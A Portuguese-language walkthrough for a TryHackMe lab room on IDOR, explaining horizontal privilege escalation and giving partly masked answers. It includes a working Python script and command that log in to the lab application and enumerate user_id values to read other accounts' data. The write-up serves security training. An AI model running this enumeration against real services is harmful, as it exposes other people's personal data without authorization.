# Dia 5 - IDOR: Santa's Little IDOR

Este guia acompanha [IDOR - Santa's Little IDOR](https://tryhackme.com/room/idor-aoc2025-zl6MywQid9). Inicie a Lab Machine e abra o TryPresentMe em `http://<IP_DA_LAB_MACHINE>/` por uma conexão VPN ou pela AttackBox. Use a conta de treinamento `niels` e a senha mostrada na tarefa.

## Entender a referência direta ao objeto

Uma IDOR ocorre quando a aplicação aceita um identificador de objeto, mas não confere se a conta autenticada pode ler aquele objeto. Neste exercício, a troca de `user_id` permite consultar informações de outras contas do mesmo nível. Isso caracteriza escalada horizontal.

Resposta 1: `Ins...` (nome da vulnerabilidade em inglês)

Resposta 2: `Hor...` (tipo de escalada em inglês)

## Observar e testar a requisição

Entre no site, abra as ferramentas do navegador e examine a guia de rede ao carregar a página de conta. Identifique a chamada a `/api/parents/view_accountinfo` e o parâmetro `user_id`. A autenticação usa um token `Bearer`; copie apenas o token da sua sessão laboratorial. Alterar o identificador deve produzir dados de outro pai, o que confirma a falha de autorização.

Uma forma de percorrer os IDs no terminal é fazer o login e reutilizar o token na mesma sessão HTTP. Substitua o IP e a senha pela da sua instância:

```python
import requests

base = 'http://<IP_DA_LAB_MACHINE>/api'
s = requests.Session()
r = s.post(base + '/auth/login', data={
    'username': 'niels',
    'password': '<SENHA_MOSTRADA_NA_SALA>',
}, timeout=10)
r.raise_for_status()
s.headers['Authorization'] = 'Bearer ' + r.json()['access_token']

for user_id in range(1, 41):
    r = s.get(base + '/parents/view_accountinfo',
              params={'user_id': user_id}, timeout=10)
    if r.ok:
        conta = r.json()
        print(user_id, conta.get('username'), len(conta.get('children', [])))
```

Procure a linha com dez crianças e insira o `user_id`, não o nome da conta. As tarefas bônus sem resposta podem ser marcadas após você explorar os exemplos opcionais mostrados na sala.

O [script de enumeração](scripts/dia05-enumerar-contas.py) realiza o mesmo teste, pede a senha sem exibi-la no terminal e aceita um intervalo de IDs:

```bash
python3 scripts/dia05-enumerar-contas.py --ip 10.x.x.x --inicio 1 --fim 40
```

Resposta 3: `##` (número inteiro)
